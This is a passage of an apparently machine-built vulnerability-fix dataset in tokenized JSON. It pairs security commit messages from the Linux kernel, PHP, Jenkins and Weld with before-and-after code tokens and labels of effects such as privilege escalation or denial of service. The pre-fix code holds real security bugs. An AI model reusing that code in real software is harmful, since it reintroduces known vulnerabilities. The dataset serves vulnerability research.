"contexts", ".", "cache", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "javax", ".", "inject", ".", "Inject", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "import", "javax", ".", "servlet", ".", "annotation", ".", "WebServlet", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServlet", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletRequest", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "import", "org", ".", "jboss", ".", "weld", ".", "context", ".", "beanstore", ".", "ConversationNamingScheme", ";", "@", "WebServlet", "(", "value", "=", "\"", "/", "servlet", "\"", ",", "asyncSupported", "=", "true", ")", "public", "class", "SimpleServlet", "extends", "HttpServlet", "{", "@", "Inject", "private", "ConversationScopedBean", "bean", ";", "@", "Override", "protected", "void", "doGet", "(", "HttpServletRequest", "req", ",", "HttpServletResponse", "resp", ")", "throws", "ServletException", ",", "IOException", "{", "String", "action", "=", "req", ".", "getParameter", "(", "\"", "action", "\"", ");", "String", "sequence", "=", "req", ".", "getParameter", "(", "\"", "sequence", "\"", ");", "String", "poison", "=", "req", ".", "getParameter", "(", "\"", "poison", "\"", ");", "if", "(", "\"", "getAndSet", "\"", ".", "equals", "(", "action", ")", ")", "{", "/", "/", "the", "value", "should", "always", "be", "foo", "String", "value", "=", "bean", ".", "getAndSet", "(", "\"", "bar", "\"", "+", "sequence", ")", ";", "resp", ".", "getWriter", "(", ").", "println", "(", "value", ")", ";", "if", "(", "poison", "!", "=", "null", ")", "{", "/", "/", "this", "is", "a", "poisoning", "request", "/", "/", "normal", "applications", "should", "never", "do", "something", "like", "this", "/", "/", "we", "just", "do", "this", "to", "cause", "an", "exception", "to", "be", "thrown", "out", "of", "ConversationContext", ".", "deactivate", "req", ".", "removeAttribute", "(", "ConversationNamingScheme", ".", "PARAMETER_NAME", ")", ";", "}", "}", "else", "{", "throw", "new", "IllegalArgumentException", "(", "action", ")", ";", "}", "}", "}</s>"], "docstring_tokens": ["obtain", "information", "from", "a", "previous", "conversation"]}
{"contents": ["x86/asm/entry/64:", "Remove", "a", "bogus", "'ret_from_fork'", "optimization", "'ret_from_fork'", "checks", "TIF_IA32", "to", "determine", "whether", "'pt_regs'", "and", "the", "related", "state", "make", "sense", "for", "'ret_from_sys_call'.", "This", "is", "entirely", "the", "wrong", "check.", "TS_COMPAT", "would", "make", "a", "little", "more", "sense,", "but", "there's", "really", "no", "point", "in", "keeping", "this", "optimization", "at", "all.", "This", "fixes", "a", "return", "to", "the", "wrong", "user", "CS", "if", "we", "came", "from", "int", "0x80", "in", "a", "64-bit", "task.", "Signed-off-by:", "Andy", "Lutomirski", "<luto@amacapital.net>", "Cc:", "Borislav", "Petkov", "<bp@alien8.de>", "Cc:", "Denys", "Vlasenko", "<dvlasenk@redhat.com>", "Cc:", "H.", "Peter", "Anvin", "<hpa@zytor.com>", "Cc:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>", "Cc:", "Oleg", "Nesterov", "<oleg@redhat.com>", "Cc:", "Thomas", "Gleixner", "<tglx@linutronix.de>", "Cc:", "<stable@vger.kernel.org>", "Link:", "http://lkml.kernel.org/r/4710be56d76ef994ddf59087aad98c000fbab9a4.1424989793.git.luto@amacapital.net", "[", "Backported", "from", "tip:x86/asm.", "]", "Signed-off-by:", "Ingo", "Molnar", "<mingo@kernel.org>"], "code_tokens": ["/", "*", "*", "By", "the", "time", "we", "get", "here", ",", "we", "have", "no", "idea", "whether", "our", "pt_regs", ",", "*", "ti", "flags", ",", "and", "ti", "status", "came", "from", "the", "64", "-", "bit", "SYSCALL", "fast", "path", ",", "*", "the", "slow", "path", ",", "or", "one", "of", "the", "ia32entry", "paths", ".", "*", "Use", "int_ret_from_sys_call", "to", "return", ",", "since", "it", "can", "safely", "handle", "*", "all", "of", "the", "above", ".", "*", "/", "jmp", "int_ret_from_sys_call</s>testl", "$", "_TIF_IA32", ",", "TI_flags", "(", "%", "rcx", ")", "#", "32", "-", "bit", "compat", "task", "needs", "IRET", "jnz", "int_ret_from_sys_call", "RESTORE_TOP_OF_STACK", "%", "rdi", ",", "-", "ARGOFFSET", "jmp", "ret_from_sys_call", "#", "go", "to", "the", "SYSRET", "fastpath"], "docstring_tokens": ["gain", "elevated", "privileges", "on", "the", "system"]}
{"contents": ["[SECURITY-794]"], "code_tokens": ["import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "@", "RequirePOST", "Jenkins", ".", "getInstance", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "<", "f", ":", "textbox", "checkMethod", "=", "\"", "post", "\"", "/>", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "2018", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "tools", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "HttpMethod", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "InteractivePage", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "WebRequest", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "html", ".", "HtmlPage", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "html", ".", "HtmlTextInput", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "javascript", ".", "JavaScriptEngine", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "javascript", ".", "host", ".", "xml", ".", "XMLHttpRequest", ";", "import", "hudson", ".", "model", ".", "JDK", ";", "import", "hudson", ".", "model", ".", "User", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "net", ".", "sourceforge", ".", "htmlunit", ".", "corejs", ".", "javascript", ".", "Function", ";", "import", "net", ".", "sourceforge", ".", "htmlunit", ".", "corejs", ".", "javascript", ".", "Scriptable", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "rules", ".", "TemporaryFolder", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Issue", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "MockAuthorizationStrategy", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "javax", ".", "annotation", ".", "Nullable", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Field", ";", "import", "java", ".", "net", ".", "URL", ";", "import", "java", ".", "net", ".", "URLDecoder", ";", "import", "java", ".", "net", ".", "URLEncoder", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "List", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "containsString", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertThat", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "fail", ";", "public", "class", "ZipExtractionInstallerTest", "{", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Rule", "public", "TemporaryFolder", "tmp", "=", "new", "TemporaryFolder", "(", ");", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "794", "\"", ")", "public", "void", "onlyAdminCanReachTheDoCheck", "(", ")", "throws", "Exception", "{", "final", "String", "ADMIN", "=", "\"", "admin", "\"", ";", "final", "String", "USER", "=", "\"", "user", "\"", ";", "j", ".", "jenkins", ".", "setCrumbIssuer", "(", "null", ")", ";", "j", ".", "jenkins", ".", "setSecurityRealm", "(", "j", ".", "createDummySecurityRealm", "(", "))", ";", "j", ".", "jenkins", ".", "setAuthorizationStrategy", "(", "new", "MockAuthorizationStrategy", "(", ")", ".", "grant", "(", "Jenkins", ".", "ADMINISTER", ")", ".", "everywhere", "(", ").", "to", "(", "ADMIN", ")", ".", "grant", "(", "Jenkins", ".", "READ", ")", ".", "everywhere", "(", ").", "to", "(", "USER", ")", ")", ";", "User", ".", "getById", "(", "ADMIN", ",", "true", ")", ";", "User", ".", "getById", "(", "USER", ",", "true", ")", ";", "WebRequest", "request", "=", "new", "WebRequest", "(", "new", "URL", "(", "j", ".", "getURL", "(", ")", "+", "\"", "descriptorByName", "/", "hudson", ".", "tools", ".", "ZipExtractionInstaller", "/", "checkUrl", "\"", "),", "HttpMethod", ".", "POST", ")", ";", "request", ".", "setRequestBody", "(", "URLEncoder", ".", "encode", "(", "\"", "value", "=", "https", ":", "//", "www", ".", "google", ".", "com", "\"", ",", "StandardCharsets", ".", "UTF_8", ".", "name", "(", "))", ");", "JenkinsRule", ".", "WebClient", "adminWc", "=", "j", ".", "createWebClient", "(", ");", "adminWc", ".", "login", "(", "ADMIN", ")", ";", "assertEquals", "(", "200", ",", "adminWc", ".", "getPage", "(", "request", ")", ".", "getWebResponse", "(", ").", "getStatusCode", "(", "))", ";", "JenkinsRule", ".", "WebClient", "userWc", "=", "j", ".", "createWebClient", "(", ");", "userWc", ".", "getOptions", "(", ").", "setThrowExceptionOnFailingStatusCode", "(", "false", ")", ";", "userWc", ".", "login", "(", "USER", ")", ";", "assertEquals", "(", "403", ",", "userWc", ".", "getPage", "(", "request", ")", ".", "getWebResponse", "(", ").", "getStatusCode", "(", "))", ";", "}", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "794", "\"", ")", "public", "void", "roundtrip", "(", ")", "throws", "Exception", "{", "final", "String", "VALID_URL", "=", "\"", "https", ":", "//", "www", ".", "google", ".", "com", "\"", ";", "final", "String", "INVALID_URL", "=", "\"", "only", "-", "crappy", "-", "letters", "\"", ";", "ZipExtractionInstaller", "installer", "=", "new", "ZipExtractionInstaller", "(", "\"\"", ",", "VALID_URL", ",", "\"", "\")", ";", "j", ".", "jenkins", ".", "getJDKs", "(", ").", "add", "(", "new", "JDK", "(", "\"", "test", "\"", ",", "tmp", ".", "getRoot", "(", ").", "getAbsolutePath", "(", "),", "Arrays", ".", "asList", "(", "new", "InstallSourceProperty", "(", "Arrays", ".", "<", "ToolInstaller", ">", "asList", "(", "installer", ")", "))", "))", ";", "JenkinsRule", ".", "WebClient", "wc", "=", "j", ".", "createWebClient", "(", ");", "SpyingJavaScriptEngine", "jsEngine", "=", "new", "SpyingJavaScriptEngine", "(", "wc", ",", "\"", "ZipExtractionInstaller", "/", "checkUrl", "\"", ",", "HttpMethod", ".", "POST", ")", ";", "wc", ".", "setJavaScriptEngine", "(", "jsEngine", ")", ";", "HtmlPage", "page", "=", "wc", ".", "goTo", "(", "\"", "configureTools", "\"", ");", "XMLHttpRequest", "lastRequest", "=", "jsEngine", ".", "getLastRequest", "(", ");", "String", "body", "=", "URLDecoder", ".", "decode", "(", "getPrivateWebRequestField", "(", "lastRequest", ")", ".", "getRequestBody", "(", "),", "\"", "UTF", "-", "8", "\"", ");", "assertThat", "(", "body", ",", "containsString", "(", "VALID_URL", ")", ");", "assertEquals", "(", "FormValidation", ".", "ok", "(", ").", "renderHtml", "(", "),", "lastRequest", ".", "getResponseText", "(", "))", ";", "HtmlTextInput", "urlInput", "=", "page", ".", "getDocumentElement", "(", ").", "getOneHtmlElementByAttribute", "(", "\"", "input", "\"", ",", "\"", "value", "\"", ",", "VALID_URL", ")", ";", "urlInput", ".", "setAttribute", "(", "\"", "value", "\"", ",", "INVALID_URL", ")", ";", "j", ".", "submit", "(", "page", ".", "getFormByName", "(", "\"", "config", "\"", "))", ";", "JDK", "jdk", "=", "j", ".", "jenkins", ".", "getJDK", "(", "\"", "test", "\"", ");", "InstallSourceProperty", "isp", "=", "jdk", ".", "getProperties", "(", ").", "get", "(", "InstallSourceProperty", ".", "class", ")", ";", "assertEquals", "(", "1", ",", "isp", ".", "installers", ".", "size", "(", "))", ";", "assertEquals", "(", "INVALID_URL", ",", "isp", ".", "installers", ".", "get", "(", "ZipExtractionInstaller", ".", "class", ")", ".", "getUrl", "(", "))", ";", "wc", ".", "goTo", "(", "\"", "configureTools", "\"", ");", "lastRequest", "=", "jsEngine", ".", "getLastRequest", "(", ");", "body", "=", "URLDecoder", ".", "decode", "(", "getPrivateWebRequestField", "(", "lastRequest", ")", ".", "getRequestBody", "(", "),", "\"", "UTF", "-", "8", "\"", ");", "assertThat", "(", "body", ",", "containsString", "(", "INVALID_URL", ")", ");", "assertThat", "(", "lastRequest", ".", "getResponseText", "(", "),", "containsString", "(", "Messages", ".", "ZipExtractionInstaller_malformed_url", "(", "))", ");", "}", "private", "class", "SpyingJavaScriptEngine", "extends", "JavaScriptEngine", "{", "private", "List", "<", "XMLHttpRequest", ">", "storedRequests", "=", "new", "ArrayList", "<", ">(", ");", "private", "String", "urlToMatch", ";", "private", "HttpMethod", "method", ";", "SpyingJavaScriptEngine", "(", "JenkinsRule", ".", "WebClient", "wc", ",", "@", "Nullable", "String", "urlToMatch", ",", "@", "Nullable", "HttpMethod", "method", ")", "{", "super", "(", "wc", ")", ";", "this", ".", "urlToMatch", "=", "urlToMatch", ";", "this", ".", "method", "=", "method", ";", "}", "@", "Override", "public", "Object", "callFunction", "(", "InteractivePage", "page", ",", "Function", "function", ",", "Scriptable", "scope", ",", "Scriptable", "thisObject", ",", "Object", "[", "]", "args", ")", "{", "if", "(", "thisObject", "instanceof", "XMLHttpRequest", ")", "{", "try", "{", "WebRequest", "request", "=", "getPrivateWebRequestField", "(", "(", "XMLHttpRequest", ")", "thisObject", ")", ";", "boolean", "correctUrl", "=", "urlToMatch", "=", "=", "null", "|", "|", "request", ".", "getUrl", "(", ").", "toString", "(", ").", "contains", "(", "urlToMatch", ")", ";", "boolean", "correctMethod", "=", "method", "=", "=", "null", "|", "|", "request", ".", "getHttpMethod", "(", ").", "equals", "(", "method", ")", ";", "if", "(", "correctUrl", "&", "&", "correctMethod", ")", "{", "if", "(", "((", "XMLHttpRequest", ")", "thisObject", ")", ".", "getReadyState", "(", ")", "=", "=", "4", ")", "{", "storedRequests", ".", "add", "(", "(", "XMLHttpRequest", ")", "thisObject", ")", ";", "}", "}", "}", "catch", "(", "NoSuchFieldException", "|", "IllegalAccessException", "e", ")", "{", "e", ".", "printStackTrace", "(", ");", "}", "}", "return", "super", ".", "callFunction", "(", "page", ",", "function", ",", "scope", ",", "thisObject", ",", "args", ")", ";", "}", "@", "Nonnull", "public", "XMLHttpRequest", "getLastRequest", "(", ")", "{", "if", "(", "storedRequests", ".", "isEmpty", "(", "))", "{", "fail", "(", "\"", "There", "is", "no", "available", "requests", "for", "the", "proposed", "url", "/", "method", "\"", ");", "}", "return", "storedRequests", ".", "get", "(", "storedRequests", ".", "size", "(", ")", "-", "1", ")", ";", "}", "}", "private", "static", "WebRequest", "getPrivateWebRequestField", "(", "XMLHttpRequest", "xmlHttpRequest", ")", "throws", "NoSuchFieldException", ",", "IllegalAccessException", "{", "Field", "webRequest_Field", "=", "XMLHttpRequest", ".", "class", ".", "getDeclaredField", "(", "\"", "webRequest_", "\"", ");", "webRequest_Field", ".", "setAccessible", "(", "true", ")", ";", "return", "(", "WebRequest", ")", "webRequest_Field", ".", "get", "(", "xmlHttpRequest", ")", ";", "}", "}</s><", "f", ":", "textbox", "/", ">"], "docstring_tokens": ["registration", "of", "user", "names", "containing", "control", "characters"]}
{"contents": ["perf/x86:", "Fix", "offcore_rsp", "valid", "mask", "for", "SNB/IVB", "The", "valid", "mask", "for", "both", "offcore_response_0", "and", "offcore_response_1", "was", "wrong", "for", "SNB/SNB-EP,", "IVB/IVB-EP.", "It", "was", "possible", "to", "write", "to", "reserved", "bit", "and", "cause", "a", "GP", "fault", "crashing", "the", "kernel.", "This", "patch", "fixes", "the", "problem", "by", "correctly", "marking", "the", "reserved", "bits", "in", "the", "valid", "mask", "for", "all", "the", "processors", "mentioned", "above.", "A", "distinction", "between", "desktop", "and", "server", "parts", "is", "introduced", "because", "bits", "24-30", "are", "only", "available", "on", "the", "server", "parts.", "This", "version", "of", "the", "patch", "is", "just", "a", "rebase", "to", "perf/urgent", "tree", "and", "should", "apply", "to", "older", "kernels", "as", "well.", "Signed-off-by:", "Stephane", "Eranian", "<eranian@google.com>", "Cc:", "peterz@infradead.org", "Cc:", "jolsa@redhat.com", "Cc:", "gregkh@linuxfoundation.org", "Cc:", "security@kernel.org", "Cc:", "ak@linux.intel.com", "Signed-off-by:", "Ingo", "Molnar", "<mingo@kernel.org>"], "code_tokens": ["INTEL_EVENT_EXTRA_REG", "(", "0xb7", ",", "MSR_OFFCORE_RSP_0", ",", "0x3f807f8fffull", ",", "RSP_0", ")", ",", "INTEL_EVENT_EXTRA_REG", "(", "0xbb", ",", "MSR_OFFCORE_RSP_1", ",", "0x3f807f8fffull", ",", "RSP_1", ")", ",", "EVENT_EXTRA_END", "}", ";", "static", "struct", "extra_reg", "intel_snbep_extra_regs", "[", "]", "__read_mostly", "=", "{", "INTEL_EVENT_EXTRA_REG", "(", "0xb7", ",", "MSR_OFFCORE_RSP_0", ",", "0x3fffff8fffull", ",", "RSP_0", ")", ",", "INTEL_EVENT_EXTRA_REG", "(", "0xbb", ",", "MSR_OFFCORE_RSP_1", ",", "0x3fffff8fffull", ",", "RSP_1", ")", ",", "if", "(", "boot_cpu_data", ".", "x86_model", "=", "=", "45", ")", "x86_pmu", ".", "extra_regs", "=", "intel_snbep_extra_regs", ";", "else", "x86_pmu", ".", "extra_regs", "=", "intel_snb_extra_regs", ";", "if", "(", "boot_cpu_data", ".", "x86_model", "=", "=", "62", ")", "x86_pmu", ".", "extra_regs", "=", "intel_snbep_extra_regs", ";", "else", "x86_pmu", ".", "extra_regs", "=", "intel_snb_extra_regs", ";</s>INTEL_EVENT_EXTRA_REG", "(", "0xb7", ",", "MSR_OFFCORE_RSP_0", ",", "0x3fffffffffull", ",", "RSP_0", ")", ",", "INTEL_EVENT_EXTRA_REG", "(", "0xbb", ",", "MSR_OFFCORE_RSP_1", ",", "0x3fffffffffull", ",", "RSP_1", ")", ",", "x86_pmu", ".", "extra_regs", "=", "intel_snb_extra_regs", ";", "x86_pmu", ".", "extra_regs", "=", "intel_snb_extra_regs", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(general", "protection", "fault", "and", "system", "crash", ")"]}
{"contents": ["[NETFILTER]:", "ipt_recent:", "last_pkts", "is", "an", "array", "of", "\"unsigned", "long\"", "not", "\"u_int32_t\"", "This", "fixes", "various", "crashes", "on", "64-bit", "when", "using", "this", "module.", "Based", "upon", "a", "patch", "by", "Juergen", "Kreileder", "<jk@blackdown.de>.", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>", "ACKed-by:", "Patrick", "McHardy", "<kaber@trash.net>"], "code_tokens": ["memset", "(", "curr_table", "-", ">", "table", "[", "count", "]", ".", "last_pkts", ",", "0", ",", "ip_pkt_list_tot", "*", "sizeof", "(", "unsigned", "long", ")", ");", "memset", "(", "r_list", "[", "location", "]", ".", "last_pkts", ",", "0", ",", "ip_pkt_list_tot", "*", "sizeof", "(", "unsigned", "long", ")", ");", "memset", "(", "r_list", "[", "location", "]", ".", "last_pkts", ",", "0", ",", "ip_pkt_list_tot", "*", "sizeof", "(", "unsigned", "long", ")", ");", "sizeof", "(", "unsigned", "long", ")", "*", "ip_pkt_list_tot", "*", "ip_list_tot", ")", ";", "hold", "=", "vmalloc", "(", "sizeof", "(", "unsigned", "long", ")", "*", "ip_pkt_list_tot", "*", "ip_list_tot", ")", ";</s>memset", "(", "curr_table", "-", ">", "table", "[", "count", "]", ".", "last_pkts", ",", "0", ",", "ip_pkt_list_tot", "*", "sizeof", "(", "u_int32_t", ")", ");", "memset", "(", "r_list", "[", "location", "]", ".", "last_pkts", ",", "0", ",", "ip_pkt_list_tot", "*", "sizeof", "(", "u_int32_t", ")", ");", "memset", "(", "r_list", "[", "location", "]", ".", "last_pkts", ",", "0", ",", "ip_pkt_list_tot", "*", "sizeof", "(", "u_int32_t", ")", ");", "sizeof", "(", "u_int32_t", ")", "*", "ip_pkt_list_tot", "*", "ip_list_tot", ")", ";", "hold", "=", "vmalloc", "(", "sizeof", "(", "u_int32_t", ")", "*", "ip_pkt_list_tot", "*", "ip_list_tot", ")", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(kernel", "panic", ")"]}
{"contents": ["random:", "fix", "crng_ready()", "test", "The", "crng_init", "variable", "has", "three", "states:", "0:", "The", "CRNG", "is", "not", "initialized", "at", "all", "1:", "The", "CRNG", "has", "a", "small", "amount", "of", "entropy,", "hopefully", "good", "enough", "for", "early-boot,", "non-cryptographical", "use", "cases", "2:", "The", "CRNG", "is", "fully", "initialized", "and", "we", "are", "sure", "it", "is", "safe", "for", "cryptographic", "use", "cases.", "The", "crng_ready()", "function", "should", "only", "return", "true", "once", "we", "are", "in", "the", "last", "state.", "This", "addresses", ".", "Reported-by:", "Jann", "Horn", "<jannh@google.com>", "Fixes:", "e192be9d9a30", "(\"random:", "replace", "non-blocking", "pool...\")", "Cc:", "stable@kernel.org", "#", "4.8+", "Signed-off-by:", "Theodore", "Ts'o", "<tytso@mit.edu>", "Reviewed-by:", "Jann", "Horn", "<jannh@google.com>"], "code_tokens": ["#", "define", "crng_ready", "(", ")", "(", "likely", "(", "crng_init", ">", "1", ")", ")", "if", "(", "crng_init", "!", "=", "0", ")", "{", "if", "(", "crng_ready", "(", ")", "&", "&", "if", "(", "unlikely", "(", "crng_init", "=", "=", "0", ")", ")", "{", "if", "(", "unlikely", "(", "crng_init", "=", "=", "0", ")", ")", "{</s>#", "define", "crng_ready", "(", ")", "(", "likely", "(", "crng_init", ">", "0", ")", ")", "if", "(", "crng_ready", "(", "))", "{", "if", "(", "crng_init", ">", "1", "&", "&", "if", "(", "!", "crng_ready", "(", "))", "{", "if", "(", "!", "crng_ready", "(", "))", "{"], "docstring_tokens": ["use", "the", "data", "allocated", "for", "the", "seed", "before", "it", "was", "sufficiently", "generated", "."]}
{"contents": ["Fix", "#69975:", "PHP", "segfaults", "when", "accessing", "nvarchar(max)", "defined", "columns", "The", "SQL", "Server", "Native", "Client", "11.0", "and", "maybe", "other", "ODBC", "drivers", "report", "NVARCHAR(MAX)", "columns", "as", "SQL_WVARCHAR", "with", "size", "0.", "This", "causes", "too", "small", "a", "buffer", "to", "be", "emalloc'd,", "likely", "causing", "a", "segfault", "in", "the", "following.", "As", "we", "don't", "know", "the", "real", "size", "of", "the", "column", "data,", "we", "treat", "such", "colums", "as", "SQL_WLONGVARCHAR.", "The", "related", "bug", "#67437", "suggests", "that", "some", "drivers", "report", "a", "size", "of", "~4GB.", "It", "is", "not", "certain", "that", "this", "is", "really", "the", "case", "(there", "might", "be", "some", "integer", "overflow", "involved,", "and", "anyway,", "there", "has", "been", "no", "feedback),", "so", "we", "do", "not", "cater", "for", "this", "now.", "However,", "it", "would", "not", "be", "hard", "to", "treat", "all", "sizes", "above", "a", "certain", "threshold", "in", "a", "similar", "way,", "i.e.", "as", "SQL_WLONGVARCHAR."], "code_tokens": ["/", "*", "Workaround", "for", "drivers", "that", "report", "NVARCHAR", "(", "MAX", ")", "columns", "as", "SQL_WVARCHAR", "with", "size", "0", "(", "bug", "#", "69975", ")", "*", "/", "if", "(", "result", "-", ">", "values", "[", "i", "]", ".", "coltype", "=", "=", "SQL_WVARCHAR", "&", "&", "displaysize", "=", "=", "0", ")", "{", "result", "-", ">", "values", "[", "i", "]", ".", "coltype", "=", "SQL_WLONGVARCHAR", ";", "result", "-", ">", "values", "[", "i", "]", ".", "value", "=", "NULL", ";", "break", ";", "}", "-", "-", "TEST", "-", "-", "Bug", "#", "69975", "(", "PHP", "segfaults", "when", "accessing", "nvarchar", "(", "max", ")", "defined", "columns", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "include", "'", "skipif", ".", "inc", "'", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "include", "'", "config", ".", "inc", "'", ";", "$", "conn", "=", "odbc_connect", "(", "$", "dsn", ",", "$", "user", ",", "$", "pass", ")", ";", "@", "odbc_exec", "(", "$", "conn", ",", "'", "CREATE", "DATABASE", "odbcTEST", "'", ");", "odbc_exec", "(", "$", "conn", ",", "'", "CREATE", "TABLE", "FOO", "(", "ID", "INT", ",", "VARCHAR_COL", "NVARCHAR", "(", "MAX", ")", ")'", ");", "odbc_exec", "(", "$", "conn", ",", "\"", "INSERT", "INTO", "FOO", "VALUES", "(", "1", ",", "'", "foo", "'", ")\"", ");", "$", "result", "=", "odbc_exec", "(", "$", "conn", ",", "\"", "SELECT", "VARCHAR_COL", "FROM", "FOO", "\"", ");", "var_dump", "(", "odbc_fetch_array", "(", "$", "result", ")", ");", "echo", "\"", "ready", "\"", ";", "?", ">", "-", "-", "EXPECT", "-", "-", "array", "(", "1", ")", "{", "[", "\"", "VARCHAR_COL", "\"", "]=", ">", "string", "(", "3", ")", "\"", "foo", "\"", "}", "ready", "-", "-", "CLEAN", "-", "-", "<", "?", "php", "include", "'", "config", ".", "inc", "'", ";", "$", "conn", "=", "odbc_connect", "(", "$", "dsn", ",", "$", "user", ",", "$", "pass", ")", ";", "odbc_exec", "(", "$", "conn", ",", "'", "DROP", "TABLE", "FOO", "'", ");", "odbc_exec", "(", "$", "conn", ",", "'", "DROP", "DATABASE", "odbcTEST", "'", ");", "?", "></s>"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(application", "crash", ")", "in", "opportunistic", "circumstances"]}
{"contents": ["[PATCH]", "Fix", "double", "decrement", "of", "mqueue_mnt->mnt_count", "in", "sys_mq_open", "Fixed", "the", "refcounting", "on", "failure", "exits", "in", "sys_mq_open()", "and", "cleaned", "the", "logics", "up.", "Rules", "are", "actually", "pretty", "simple", "-", "dentry_open()", "expects", "vfsmount", "and", "dentry", "to", "be", "pinned", "down", "and", "it", "either", "transfers", "them", "into", "created", "struct", "file", "or", "drops", "them.", "Old", "code", "had", "been", "very", "confused", "in", "that", "area", "-", "if", "dentry_open()", "had", "failed", "either", "in", "do_open()", "or", "do_create(),", "we", "ended", "up", "dentry", "and", "mqueue_mnt", "dropped", "twice,", "once", "by", "dentry_open()", "cleanup", "and", "then", "by", "sys_mq_open().", "Fix", "consists", "of", "making", "the", "rules", "for", "do_create()", "and", "do_open()", "same", "as", "for", "dentry_open()", "and", "updating", "the", "sys_mq_open()", "accordingly;", "that", "actually", "leads", "to", "more", "straightforward", "code", "and", "less", "work", "on", "normal", "path.", "Signed-off-by:", "Al", "Viro", "<aviro@redhat.com>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@osdl.org>"], "code_tokens": ["if", "(", "u_attr", ")", "{", "ret", "=", "-", "EFAULT", ";", "goto", "out", ";", "ret", "=", "-", "EINVAL", ";", "goto", "out", ";", "goto", "out", ";", "return", "dentry_open", "(", "dentry", ",", "mqueue_mnt", ",", "oflag", ")", ";", "out", ":", "dput", "(", "dentry", ")", ";", "mntput", "(", "mqueue_mnt", ")", ";", "return", "ERR_PTR", "(", "ret", ")", ";", "if", "(", "(", "oflag", "&", "O_ACCMODE", ")", "=", "=", "(", "O_RDWR", "|", "O_WRONLY", ")", ")", "{", "dput", "(", "dentry", ")", ";", "mntput", "(", "mqueue_mnt", ")", ";", "}", "if", "(", "permission", "(", "dentry", "-", ">", "d_inode", ",", "oflag2acc", "[", "oflag", "&", "O_ACCMODE", "]", ",", "NULL", ")", ")", "{", "dput", "(", "dentry", ")", ";", "mntput", "(", "mqueue_mnt", ")", ";", "}", "return", "dentry_open", "(", "dentry", ",", "mqueue_mnt", ",", "oflag", ")", ";", "error", "=", "-", "EEXIST", ";", "if", "(", "oflag", "&", "O_EXCL", ")", "goto", "out", ";", "filp", "=", "do_open", "(", "dentry", ",", "oflag", 